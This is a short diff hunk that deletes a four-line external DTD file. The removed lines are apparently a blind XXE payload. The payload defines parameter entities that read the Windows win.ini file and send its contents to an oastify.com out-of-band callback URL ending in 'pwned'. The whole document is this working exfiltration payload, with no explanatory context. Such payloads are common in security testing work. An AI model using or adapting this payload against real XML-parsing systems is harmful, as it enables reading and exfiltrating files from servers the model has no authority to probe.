@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///C:/windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://e3i00ea8lfbu92ecgehtbkx9k0qrer2g.oastify.com/pwned?data=%file;'>">
-%eval;
-%exfil;
